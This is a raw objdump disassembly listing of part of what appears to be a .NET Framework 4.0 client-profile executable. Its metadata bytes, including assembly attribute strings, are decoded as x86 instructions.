  40c9d8:	0c 04                	or     $0x4,%al
  40c9da:	20 01                	and    %al,(%ecx)
  40c9dc:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c9e2:	5c                   	pop    %esp
  40c9e3:	04 20                	add    $0x20,%al
  40c9e5:	00 11                	add    %dl,(%ecx)
  40c9e7:	64 04 20             	fs add $0x20,%al
  40c9ea:	00 12                	add    %dl,(%edx)
  40c9ec:	59                   	pop    %ecx
  40c9ed:	03 28                	add    (%eax),%ebp
  40c9ef:	00 0e                	add    %cl,(%esi)
  40c9f1:	03 28                	add    (%eax),%ebp
  40c9f3:	00 0a                	add    %cl,(%edx)
  40c9f5:	03 28                	add    (%eax),%ebp
  40c9f7:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c9fd:	5c                   	pop    %esp
  40c9fe:	04 28                	add    $0x28,%al
  40ca00:	00 11                	add    %dl,(%ecx)
  40ca02:	64 04 00             	fs add $0x0,%al
  40ca05:	00 00                	add    %al,(%eax)
  40ca07:	00 04 03             	add    %al,(%ebx,%eax,1)
  40ca0a:	00 00                	add    %al,(%eax)
  40ca0c:	00 04 04             	add    %al,(%esp,%eax,1)
  40ca0f:	00 00                	add    %al,(%eax)
  40ca11:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40ca18:	06                   	push   %es
  40ca19:	00 00                	add    %al,(%eax)
  40ca1b:	00 04 07             	add    %al,(%edi,%eax,1)
  40ca1e:	00 00                	add    %al,(%eax)
  40ca20:	00 04 08             	add    %al,(%eax,%ecx,1)
  40ca23:	00 00                	add    %al,(%eax)
  40ca25:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40ca28:	00 00                	add    %al,(%eax)
  40ca2a:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40ca2d:	00 00                	add    %al,(%eax)
  40ca2f:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40ca32:	00 00                	add    %al,(%eax)
  40ca34:	00 06                	add    %al,(%esi)
  40ca36:	00 02                	add    %al,(%edx)
  40ca38:	0e                   	push   %cs
  40ca39:	12 61 08             	adc    0x8(%ecx),%ah
  40ca3c:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40ca41:	61                   	popa
  40ca42:	06                   	push   %es
  40ca43:	00 02                	add    %al,(%edx)
  40ca45:	0e                   	push   %cs
  40ca46:	05 12 61 05 00       	add    $0x56112,%eax
  40ca4b:	01 01                	add    %eax,(%ecx)
  40ca4d:	12 61 06             	adc    0x6(%ecx),%ah
  40ca50:	00 02                	add    %al,(%edx)
  40ca52:	01 12                	add    %edx,(%edx)
  40ca54:	61                   	popa
  40ca55:	0e                   	push   %cs
  40ca56:	07                   	pop    %es
  40ca57:	00 02                	add    %al,(%edx)
  40ca59:	01 12                	add    %edx,(%edx)
  40ca5b:	61                   	popa
  40ca5c:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40ca61:	01 12                	add    %edx,(%edx)
  40ca63:	61                   	popa
  40ca64:	0d 06 00 02 01       	or     $0x1020006,%eax
  40ca69:	12 61 0c             	adc    0xc(%ecx),%ah
  40ca6c:	06                   	push   %es
  40ca6d:	00 02                	add    %al,(%edx)
  40ca6f:	01 12                	add    %edx,(%edx)
  40ca71:	61                   	popa
  40ca72:	02 06                	add    (%esi),%al
  40ca74:	00 02                	add    %al,(%edx)
  40ca76:	01 12                	add    %edx,(%edx)
  40ca78:	61                   	popa
  40ca79:	0b 06                	or     (%esi),%eax
  40ca7b:	00 02                	add    %al,(%edx)
  40ca7d:	01 12                	add    %edx,(%edx)
  40ca7f:	61                   	popa
  40ca80:	0a 03                	or     (%ebx),%al
  40ca82:	06                   	push   %es
  40ca83:	11 78 04             	adc    %edi,0x4(%eax)
  40ca86:	20 01                	and    %al,(%ecx)
  40ca88:	01 08                	add    %ecx,(%eax)
  40ca8a:	08 01                	or     %al,(%ecx)
  40ca8c:	00 08                	add    %cl,(%eax)
  40ca8e:	00 00                	add    %al,(%eax)
  40ca90:	00 00                	add    %al,(%eax)
  40ca92:	00 1e                	add    %bl,(%esi)
  40ca94:	01 00                	add    %eax,(%eax)
  40ca96:	01 00                	add    %eax,(%eax)
  40ca98:	54                   	push   %esp
  40ca99:	02 16                	add    (%esi),%dl
  40ca9b:	57                   	push   %edi
  40ca9c:	72 61                	jb     0x40caff
  40ca9e:	70 4e                	jo     0x40caee
  40caa0:	6f                   	outsl  %ds:(%esi),(%dx)
  40caa1:	6e                   	outsb  %ds:(%esi),(%dx)
  40caa2:	45                   	inc    %ebp
  40caa3:	78 63                	js     0x40cb08
  40caa5:	65 70 74             	gs jo  0x40cb1c
  40caa8:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40caaf:	77 73                	ja     0x40cb24
  40cab1:	01 05 20 01 01 11    	add    %eax,0x11010120
  40cab7:	71 08                	jno    0x40cac1
  40cab9:	01 00                	add    %eax,(%eax)
  40cabb:	02 00                	add    (%eax),%al
  40cabd:	00 00                	add    %al,(%eax)
  40cabf:	00 00                	add    %al,(%eax)
  40cac1:	05 01 00 00 00       	add    $0x1,%eax
  40cac6:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40cac9:	00 07                	add    %al,(%edi)
  40cacb:	31 2e                	xor    %ebp,(%esi)
  40cacd:	30 2e                	xor    %ch,(%esi)
  40cacf:	30 2e                	xor    %ch,(%esi)
  40cad1:	30 00                	xor    %al,(%eax)
  40cad3:	00 65 01             	add    %ah,0x1(%ebp)
  40cad6:	00 29                	add    %ch,(%ecx)
  40cad8:	2e 4e                	cs dec %esi
  40cada:	45                   	inc    %ebp
  40cadb:	54                   	push   %esp
  40cadc:	46                   	inc    %esi
  40cadd:	72 61                	jb     0x40cb40
  40cadf:	6d                   	insl   (%dx),%es:(%edi)
  40cae0:	65 77 6f             	gs ja  0x40cb52
  40cae3:	72 6b                	jb     0x40cb50
  40cae5:	2c 56                	sub    $0x56,%al
  40cae7:	65 72 73             	gs jb  0x40cb5d
  40caea:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40caf1:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40caf4:	72 6f                	jb     0x40cb65
  40caf6:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40cafd:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40cb04:	0e                   	push   %cs
  40cb05:	14 46                	adc    $0x46,%al
  40cb07:	72 61                	jb     0x40cb6a
  40cb09:	6d                   	insl   (%dx),%es:(%edi)
  40cb0a:	65 77 6f             	gs ja  0x40cb7c
  40cb0d:	72 6b                	jb     0x40cb7a
  40cb0f:	44                   	inc    %esp
  40cb10:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40cb17:	61                   	popa
  40cb18:	6d                   	insl   (%dx),%es:(%edi)
  40cb19:	65 1f                	gs pop %ds
  40cb1b:	2e 4e                	cs dec %esi
  40cb1d:	45                   	inc    %ebp
  40cb1e:	54                   	push   %esp
  40cb1f:	20 46 72             	and    %al,0x72(%esi)
  40cb22:	61                   	popa
  40cb23:	6d                   	insl   (%dx),%es:(%edi)
  40cb24:	65 77 6f             	gs ja  0x40cb96
  40cb27:	72 6b                	jb     0x40cb94
  40cb29:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40cb2c:	43                   	inc    %ebx
  40cb2d:	6c                   	insb   (%dx),%es:(%edi)
  40cb2e:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40cb35:	6f                   	outsl  %ds:(%esi),(%dx)
  40cb36:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40cb3d:	04 49                	add    $0x49,%al
  40cb3f:	74 65                	je     0x40cba6
  40cb41:	6d                   	insl   (%dx),%es:(%edi)
  40cb42:	00 00                	add    %al,(%eax)
  40cb44:	03 07                	add    (%edi),%eax
  40cb46:	01 08                	add    %ecx,(%eax)
  40cb48:	04 00                	add    $0x0,%al
  40cb4a:	01 08                	add    %ecx,(%eax)
  40cb4c:	0e                   	push   %cs
  40cb4d:	03 07                	add    (%edi),%eax
  40cb4f:	01 02                	add    %eax,(%edx)
  40cb51:	05 00 00 12 80       	add    $0x80120000,%eax
  40cb56:	b1 05                	mov    $0x5,%cl
  40cb58:	20 01                	and    %al,(%ecx)
  40cb5a:	0e                   	push   %cs
  40cb5b:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40cb60:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40cb66:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40cb6c:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40cb71:	03 02                	add    (%edx),%eax
  40cb73:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40cb78:	14 07                	adc    $0x7,%al
  40cb7a:	08 0e                	or     %cl,(%esi)
  40cb7c:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40cb82:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40cb88:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40cb8e:	20 03                	and    %al,(%ebx)
  40cb90:	01 11                	add    %edx,(%ecx)
  40cb92:	80 d5 11             	adc    $0x11,%ch
  40cb95:	80 d9 11             	sbb    $0x11,%cl
  40cb98:	80 dd 05             	sbb    $0x5,%ch
  40cb9b:	00 02                	add    %al,(%edx)
  40cb9d:	02 0e                	add    (%esi),%cl
  40cb9f:	0e                   	push   %cs
  40cba0:	06                   	push   %es
  40cba1:	20 01                	and    %al,(%ecx)
  40cba3:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40cba8:	20 01                	and    %al,(%ecx)
  40cbaa:	08 08                	or     %cl,(%eax)
  40cbac:	07                   	pop    %es
  40cbad:	00 01                	add    %al,(%ecx)
  40cbaf:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40cbb4:	07                   	pop    %es
  40cbb5:	20 02                	and    %al,(%edx)
  40cbb7:	01 12                	add    %edx,(%edx)
  40cbb9:	80 c9 08             	or     $0x8,%cl
  40cbbc:	06                   	push   %es
  40cbbd:	20 01                	and    %al,(%ecx)
  40cbbf:	01 12                	add    %edx,(%edx)
  40cbc1:	80 f1 09             	xor    $0x9,%cl
  40cbc4:	20 02                	and    %al,(%edx)
  40cbc6:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40cbcb:	80 f5 05             	xor    $0x5,%ch
  40cbce:	20 02                	and    %al,(%edx)
  40cbd0:	08 08                	or     %cl,(%eax)
  40cbd2:	08 06                	or     %al,(%esi)
  40cbd4:	20 02                	and    %al,(%edx)
  40cbd6:	01 12                	add    %edx,(%edx)
  40cbd8:	0d 02 05 20 02       	or     $0x2200502,%eax
  40cbdd:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40cbe0:	09 20                	or     %esp,(%eax)
  40cbe2:	03 01                	add    (%ecx),%eax
  40cbe4:	12 61 02             	adc    0x2(%ecx),%ah
  40cbe7:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40cbed:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40cbf3:	01 0e                	add    %ecx,(%esi)
  40cbf5:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40cbfb:	02 09                	add    (%ecx),%cl
  40cbfd:	20 04 01             	and    %al,(%ecx,%eax,1)
  40cc00:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40cc06:	0c 20                	or     $0x20,%al
  40cc08:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40cc0d:	08 08                	or     %cl,(%eax)
  40cc0f:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40cc15:	01 11                	add    %edx,(%ecx)
  40cc17:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40cc1d:	02 12                	add    (%edx),%dl
  40cc1f:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40cc22:	02 08                	add    (%eax),%cl
  40cc24:	08 05 20 01 08 12    	or     %al,0x12080120
  40cc2a:	25 06 00 02 08       	and    $0x8020006,%eax
  40cc2f:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40cc34:	03 08                	add    (%eax),%ecx
  40cc36:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40cc3b:	20 01                	and    %al,(%ecx)
  40cc3d:	01 12                	add    %edx,(%edx)
  40cc3f:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40cc45:	1c 0c                	sbb    $0xc,%al
  40cc47:	07                   	pop    %es
  40cc48:	06                   	push   %es
  40cc49:	1c 02                	sbb    $0x2,%al
  40cc4b:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40cc50:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40cc56:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40cc59:	02 07                	add    (%edi),%al
  40cc5b:	20 02                	and    %al,(%edx)
  40cc5d:	02 08                	add    (%eax),%cl
  40cc5f:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40cc65:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40cc6b:	07                   	pop    %es
  40cc6c:	0a 12                	or     (%edx),%dl
  40cc6e:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40cc75:	08 12 81 
  40cc78:	41                   	inc    %ecx
  40cc79:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40cc7f:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40cc84:	4d                   	dec    %ebp
  40cc85:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40cc8a:	0e                   	push   %cs
  40cc8b:	05 00 00 12 81       	add    $0x81120000,%eax
  40cc90:	41                   	inc    %ecx
  40cc91:	05 20 00 12 81       	add    $0x81120020,%eax
  40cc96:	55                   	push   %ebp
  40cc97:	06                   	push   %es
  40cc98:	00 00                	add    %al,(%eax)
  40cc9a:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40cc9f:	00 01                	add    %al,(%ecx)
  40cca1:	0e                   	push   %cs
  40cca2:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40cca7:	01 11                	add    %edx,(%ecx)
  40cca9:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40ccb0:	41                   	inc    %ecx
  40ccb1:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40ccb7:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40ccbe:	49                   	dec    %ecx
  40ccbf:	0e                   	push   %cs
  40ccc0:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40ccc6:	0e                   	push   %cs
  40ccc7:	0e                   	push   %cs
  40ccc8:	0e                   	push   %cs
  40ccc9:	0e                   	push   %cs
  40ccca:	05 20 02 01 0e       	add    $0xe010220,%eax
  40cccf:	1c 07                	sbb    $0x7,%al
  40ccd1:	20 02                	and    %al,(%edx)
  40ccd3:	01 0e                	add    %ecx,(%esi)
  40ccd5:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40ccdb:	0a 02                	or     (%edx),%al
  40ccdd:	10 07                	adc    %al,(%edi)
  40ccdf:	06                   	push   %es
  40cce0:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40cce6:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40ccec:	0e                   	push   %cs
  40cced:	02 05 20 00 12 81    	add    0x81120020,%al
  40ccf3:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40ccf9:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40ccff:	91                   	xchg   %eax,%ecx
  40cd00:	04 20                	add    $0x20,%al
  40cd02:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40cd05:	04 07                	add    $0x7,%al
  40cd07:	02 02                	add    (%edx),%al
  40cd09:	02 03                	add    (%ebx),%al
  40cd0b:	20 00                	and    %al,(%eax)
  40cd0d:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40cd10:	02 18                	add    (%eax),%bl
  40cd12:	02 03                	add    (%ebx),%al
  40cd14:	07                   	pop    %es
  40cd15:	01 0e                	add    %ecx,(%esi)
  40cd17:	05 00 00 12 81       	add    $0x81120000,%eax
  40cd1c:	9d                   	popf
  40cd1d:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40cd22:	1c 0a                	sbb    $0xa,%al
  40cd24:	07                   	pop    %es
  40cd25:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40cd2a:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40cd2f:	20 01                	and    %al,(%ecx)
  40cd31:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40cd37:	0e                   	push   %cs
  40cd38:	08 08                	or     %cl,(%eax)
  40cd3a:	06                   	push   %es
  40cd3b:	07                   	pop    %es
  40cd3c:	02 02                	add    (%edx),%al
  40cd3e:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40cd44:	0e                   	push   %cs
  40cd45:	0e                   	push   %cs
  40cd46:	0e                   	push   %cs
  40cd47:	05 20 00 11 81       	add    $0x81110020,%eax
  40cd4c:	ad                   	lods   %ds:(%esi),%eax
  40cd4d:	05 00 00 12 81       	add    $0x81120000,%eax
  40cd52:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40cd57:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40cd5d:	02 11                	add    (%ecx),%dl
  40cd5f:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40cd65:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40cd6c:	12 81 8d 
  40cd6f:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40cd75:	12 41 01             	adc    0x1(%ecx),%al
  40cd78:	0e                   	push   %cs
  40cd79:	05 20 01 01 13       	add    $0x13010120,%eax
  40cd7e:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40cd84:	00 06                	add    %al,(%esi)
  40cd86:	00 02                	add    %al,(%edx)
  40cd88:	0e                   	push   %cs
  40cd89:	0e                   	push   %cs
  40cd8a:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40cd8f:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40cd94:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40cd9a:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40cda0:	c5 09                	lds    (%ecx),%ecx
  40cda2:	00 02                	add    %al,(%edx)
  40cda4:	02 11                	add    (%ecx),%dl
  40cda6:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40cdac:	07                   	pop    %es
  40cdad:	02 12                	add    (%edx),%dl
  40cdaf:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40cdb4:	01 02                	add    %eax,(%edx)
  40cdb6:	0e                   	push   %cs
  40cdb7:	10 02                	adc    %al,(%edx)
  40cdb9:	06                   	push   %es
  40cdba:	00 01                	add    %al,(%ecx)
  40cdbc:	01 12                	add    %edx,(%edx)
  40cdbe:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40cdc4:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40cdcb:	0e                   	push   %cs
  40cdcc:	1c 11                	sbb    $0x11,%al
  40cdce:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40cdd4:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40cddb:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40cde1:	05 07 20 02 12       	add    $0x12022007,%eax
  40cde6:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40cded:	12 60 0e             	adc    0xe(%eax),%ah
  40cdf0:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40cdf5:	12 60 12             	adc    0x12(%eax),%ah
  40cdf8:	60                   	pusha
  40cdf9:	06                   	push   %es
  40cdfa:	15 12 41 01 12       	adc    $0x12014112,%eax
  40cdff:	60                   	pusha
  40ce00:	10 10                	adc    %dl,(%eax)
  40ce02:	01 01                	add    %eax,(%ecx)
  40ce04:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40ce09:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40ce0f:	1e                   	push   %ds
  40ce10:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40ce13:	01 12                	add    %edx,(%edx)
  40ce15:	60                   	pusha
  40ce16:	09 20                	or     %esp,(%eax)
  40ce18:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40ce1e:	13 00                	adc    (%eax),%eax
  40ce20:	07                   	pop    %es
  40ce21:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40ce26:	12 60 04             	adc    0x4(%eax),%ah
  40ce29:	20 00                	and    %al,(%eax)
  40ce2b:	13 00                	adc    (%eax),%eax
  40ce2d:	05 20 01 02 13       	add    $0x13020120,%eax
  40ce32:	00 03                	add    %al,(%ebx)
  40ce34:	07                   	pop    %es
  40ce35:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40ce3c:	e5 07                	in     $0x7,%eax
  40ce3e:	20 01                	and    %al,(%ecx)
  40ce40:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40ce46:	20 01                	and    %al,(%ecx)
  40ce48:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40ce4e:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40ce51:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40ce57:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40ce5d:	00 02                	add    %al,(%edx)
  40ce5f:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40ce65:	0e                   	push   %cs
  40ce66:	1c 00                	sbb    $0x0,%al
  40ce68:	05 12 82 05 11       	add    $0x11058212,%eax
  40ce6d:	82 09 0e             	orb    $0xe,(%ecx)
  40ce70:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40ce75:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40ce7b:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40ce80:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40ce86:	45                   	inc    %ebp
  40ce87:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40ce8d:	4d                   	dec    %ebp
  40ce8e:	1c 12                	sbb    $0x12,%al
  40ce90:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40ce95:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40ce9a:	0e                   	push   %cs
  40ce9b:	0b 00                	or     (%eax),%eax
  40ce9d:	01 15 12 45 01 13    	add    %edx,0x13014512
  40cea3:	00 12                	add    %dl,(%edx)
  40cea5:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40ceac:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40ceb1:	4d                   	dec    %ebp
  40ceb2:	1c 12                	sbb    $0x12,%al
  40ceb4:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40ceb9:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40cebe:	0e                   	push   %cs
  40cebf:	17                   	pop    %ss
  40cec0:	20 0a                	and    %cl,(%edx)
  40cec2:	01 13                	add    %edx,(%ebx)
  40cec4:	00 13                	add    %dl,(%ebx)
  40cec6:	01 13                	add    %edx,(%ebx)
  40cec8:	02 13                	add    (%ebx),%dl
  40ceca:	03 13                	add    (%ebx),%edx
  40cecc:	04 13                	add    $0x13,%al
  40cece:	05 13 06 13 07       	add    $0x7130613,%eax
  40ced3:	13 08                	adc    (%eax),%ecx
  40ced5:	13 09                	adc    (%ecx),%ecx
  40ced7:	05 07 01 12 82       	add    $0x82120107,%eax
  40cedc:	0d 07 20 03 01       	or     $0x1032007,%eax
  40cee1:	0e                   	push   %cs
  40cee2:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40cee7:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40ceed:	06                   	push   %es
  40ceee:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40cef4:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40cefa:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40ceff:	20 01                	and    %al,(%ecx)
  40cf01:	01 11                	add    %edx,(%ecx)
  40cf03:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40cf0a:	82 31 05             	xorb   $0x5,(%ecx)
  40cf0d:	20 00                	and    %al,(%eax)
  40cf0f:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40cf15:	01 12                	add    %edx,(%edx)
  40cf17:	61                   	popa
  40cf18:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40cf1e:	08 20                	or     %ah,(%eax)
  40cf20:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40cf26:	08 1a                	or     %bl,(%edx)
  40cf28:	07                   	pop    %es
  40cf29:	0a 12                	or     (%edx),%dl
  40cf2b:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40cf32:	21 1d 05 
  40cf35:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40cf3a:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40cf41:	05 0c 00 05 01       	add    $0x105000c,%eax
  40cf46:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40cf4c:	45                   	inc    %ebp
  40cf4d:	08 08                	or     %cl,(%eax)
  40cf4f:	04 07                	add    $0x7,%al
  40cf51:	02 02                	add    (%edx),%al
  40cf53:	08 09                	or     %cl,(%ecx)
  40cf55:	00 02                	add    %al,(%edx)
  40cf57:	01 12                	add    %edx,(%edx)
  40cf59:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40cf5d:	4d                   	dec    %ebp
  40cf5e:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40cf63:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40cf69:	05 08 05 07 07       	add    $0x7070508,%eax
  40cf6e:	02 12                	add    (%edx),%dl
  40cf70:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40cf74:	08 07                	or     %al,(%edi)
  40cf76:	04 12                	add    $0x12,%al
  40cf78:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40cf7d:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40cf82:	1c 06                	sbb    $0x6,%al
  40cf84:	07                   	pop    %es
  40cf85:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40cf8b:	20 01                	and    %al,(%ecx)
  40cf8d:	13 00                	adc    (%eax),%eax
  40cf8f:	08 04 07             	or     %al,(%edi,%eax,1)
  40cf92:	01 12                	add    %edx,(%edx)
  40cf94:	60                   	pusha
  40cf95:	0e                   	push   %cs
  40cf96:	07                   	pop    %es
  40cf97:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40cf9c:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40cfa2:	12 60 07             	adc    0x7(%eax),%ah
  40cfa5:	07                   	pop    %es
  40cfa6:	04 08                	add    $0x8,%al
  40cfa8:	05 1d 05 08 04       	add    $0x408051d,%eax
  40cfad:	20 01                	and    %al,(%ecx)
  40cfaf:	01 05 04 07 01 11    	add    %eax,0x11010704
  40cfb5:	64 04 00             	fs add $0x0,%al
  40cfb8:	01 0b                	add    %ecx,(%ebx)
  40cfba:	0a 04 00             	or     (%eax,%eax,1),%al
  40cfbd:	01 0b                	add    %ecx,(%ebx)
  40cfbf:	0e                   	push   %cs
  40cfc0:	04 00                	add    $0x0,%al
  40cfc2:	01 0b                	add    %ecx,(%ebx)
  40cfc4:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40cfc9:	0c 06                	or     $0x6,%al
  40cfcb:	00 01                	add    %al,(%ecx)
  40cfcd:	0b 11                	or     (%ecx),%edx
  40cfcf:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40cfd6:	04 00 01 
  40cfd9:	0a 0e                	or     (%esi),%cl
  40cfdb:	04 00                	add    $0x0,%al
  40cfdd:	01 0a                	add    %ecx,(%edx)
  40cfdf:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40cfe4:	0c 06                	or     $0x6,%al
  40cfe6:	00 01                	add    %al,(%ecx)
  40cfe8:	0a 11                	or     (%ecx),%dl
  40cfea:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40cff1:	04 00 01 
  40cff4:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40cff9:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40cffd:	ad                   	lods   %ds:(%esi),%eax
  40cffe:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40d003:	0c 07                	or     $0x7,%al
  40d005:	07                   	pop    %es
  40d006:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40d00c:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40d011:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40d017:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40d01d:	12 60 1d             	adc    0x1d(%eax),%ah
  40d020:	0e                   	push   %cs
  40d021:	0e                   	push   %cs
  40d022:	08 12                	or     %dl,(%edx)
  40d024:	60                   	pusha
  40d025:	08 05 07 01 12 81    	or     %al,0x81120107
  40d02b:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40d030:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
